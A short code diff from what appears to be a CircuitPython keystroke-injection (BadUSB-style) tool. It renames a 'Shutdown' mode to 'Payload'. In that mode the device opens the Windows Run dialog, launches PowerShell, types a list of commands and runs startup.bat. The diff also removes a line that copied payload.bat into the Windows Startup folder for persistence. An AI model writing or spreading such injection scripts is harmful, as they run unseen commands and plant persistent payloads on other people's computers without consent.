@@ -63,14 +63,13 @@ elif mode == "False":
     print("FEEDBACK Sent")
     #end loop here
     while True: led.value = True #FEEDBACK FINISHED
-elif mode == "Shutdown":
+elif mode == "Payload":
     time.sleep(1)
     kbd.send(Keycode.WINDOWS,Keycode.R)
     time.sleep(0.125)
     layout.write('powershell\n')
     time.sleep(1)
-    layout.write(f'{";".join(lst)}\n')
-    layout.write('copy "\Borealis\Assets\payload.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"')
+    layout.write(f'{";".join(lst)}\n./startup.bat\n')
 else:
     print("Not Accepted Mode")
     time.sleep(2.5)
